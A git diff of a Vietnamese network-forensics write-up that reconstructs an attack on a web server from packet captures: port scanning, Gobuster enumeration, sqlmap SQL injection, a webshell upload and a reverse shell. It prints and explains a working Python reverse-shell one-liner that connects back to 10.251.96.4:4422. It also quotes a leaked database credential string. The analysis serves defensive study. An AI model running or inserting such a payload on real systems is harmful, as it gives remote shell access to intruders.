@@ -95,12 +95,64 @@ Sừ dụng paterment *cmd* để thực hiện hành động `Reverse Shell` đ
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.251.96.4",4422));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
-ở payload này nó sẽ tạo socket kết nối tới IP `10.251.96.4` với cổng port **4422** và thực hiệ mở **/bin/sh** với chế độ tương tác để attacker có thể connect được với server.
+ở payload này nó sẽ tạo socket kết nối tới IP `10.251.96.4` với cổng port **4422** và thực hiệ mở **/bin/sh** với chế độ tương tác để attacker có thể connect được với server. Phân tích thêm một chút về payload này ```s.connect(...): server chủ động kết nối tới listener.
+os.dup2(...,0): chuyển stdin vào socket.
+os.dup2(...,1): chuyển stdout vào socket.
+os.dup2(...,2): chuyển stderr vào socket.
+/bin/sh -i: mở shell tương tác.```
+một vài phân tích cơ bản về payload đó, không đào quá sâu nhưng đủ để hiểu hành động nó thực hiện khi payload được execute.
+
 
 ![image.png](./assets/2026-07-26-network-analysts/13.png)
 
 Thấy được cổng port **4422** đã open từ attacker và connect thành công tới server, với gần 346 packet đã được truyền tải từ 2 bên và khả năng cao giao tiếp giữa hai IP này sẽ có nhiều nguy hiểm, tất cả ý trên chỉ là phỏng đoán nhưng thông thường thì điều này xảy ra là có khả năng, thực hiện kiểm tra attacker đã làm thực hiện được những hành động gì trên server thì tổng hợp như thế này, mặc dù reverse shell đã thành công từ bob-appserver (10.251.96.5) tới attacker (10.251.96.4) bằng cổng port **4422**, được thực thi dưới account có tên là `www-data` bên cạnh đó attacker cố gắng leo thang đặc quyền lên root nhưng bị thất bại
-
 ![image.png](./assets/2026-07-26-network-analysts/14.png)
+ngoài ra attacker còn thực hiện hành động nhằm vào file `**dbfuncs.php**` và thực hiện hành động deleted nhưng không có **permission** để thực hiện điều này
+![image.png](./assets/2026-07-26-network-analysts/15.png)
+đó là những gì mà đặc biệt có trong **conversation** mà attacker đã thực hiện **Reverse Shell** kèm theo đó mặc dù không thực hiện được thành công leo thang nhưng đây cũng xem là một lỗ hổng trong cấu hình của server và điều này cực kì ảnh hưởng nghiêm trọng tới security của server nếu như không khắc phục sớm.
+
+## Attack Flow của hacker
+
+Dựa vào dữ liệu capture và phân tích trên, flow attack của hacker được tóm tắt như sau:
+
+1. **Compromise and reconnaissance**
+   - Hacker đã kiểm soát một máy trong mạng nội bộ: `10.251.96.4`
+   - Từ máy này thực hiện **local port scan** tới server nội bộ `10.251.96.5`.
+   - Scan được xác định là **Nmap SYN scan** (`-sS`) bằng các packet `SYN` và phản hồi `RST, ACK`/`SYN, ACK`.
+
+2. **Port discovery**
+   - Hacker scan các cổng từ `1-1024`.
+   - Phát hiện cổng **80 mở**, xác định server là **web server**.
+
+3. **Web application enumeration**
+   - Dùng **Gobuster** quét thư mục và tài nguyên web server.
+   - Phát hiện các resource quan trọng như `login.php`, `browse.php`, `complaint.php`, `editprofile.php`, `upload.php`.
+
+4. **Application attack / SQL Injection**
+   - Hacker sử dụng **sqlmap** để tấn công `login.php` hoặc các tham số liên quan.
+   - Có bằng chứng payload SQL Injection và khả năng leak thông tin nhạy cảm.
+   - Server trả về chuỗi nghi ngờ thông tin đăng nhập/DB: `root:bobthe@localhost`.
+
+5. **File upload and webshell execution**
+   - Hacker upload file `dbfuctions.php` thông qua `upload.php`.
+   - File upload được sử dụng để tạo payload reverse shell.
+
+6. **Reverse shell**
+   - File webshell thực thi payload Python kết nối ngược tới `10.251.96.4:4422`.
+   - Kết nối xảy ra từ server `10.251.96.5` tới attacker, mở `/bin/sh -i`.
+
+7. **Post-exploitation**
+   - Giao tiếp reverse shell tạo ra gần **346 packet** giữa hai IP.
+   - Hacker hoạt động dưới tài khoản `www-data` trên server.
+   - Có cố gắng **tăng quyền lên root** nhưng thất bại.
+   - Cố gắng xóa `dbfuncs.php` cũng không thành công do thiếu quyền.
+
+### Sơ đồ flow attack (tóm tắt)
+
+`10.251.96.4 (compromised host)` → `Nmap SYN scan` → `10.251.96.5 (web server)` → `Gobuster directory discovery` → `SQL Injection attempt` → `Upload webshell (dbfuctions.php)` → `Reverse shell connect back to 10.251.96.4:4422` → `Post-exploitation activities`
+
+Phần flow attack này giúp làm rõ trình tự hacker khai thác và những mốc quan trọng trong cuộc tấn công. Cần khuyến nghị khoá chặt các cổng không cần thiết, kiểm tra kỹ ứng dụng web và xử lý các lỗ hổng upload + SQLi. Đặc biệt hơn nữa là phải cần thận trong việc configuring của server, có thể open port hoặc những service cần thiết, nhưng về phần cấu hình phải cẩn thận hơn trong phần security, kèm theo đó về phần file upload thì hãy có scope của các định dạng cố định không phải file nào cũng có thể upload được được. 
+
+
 
 
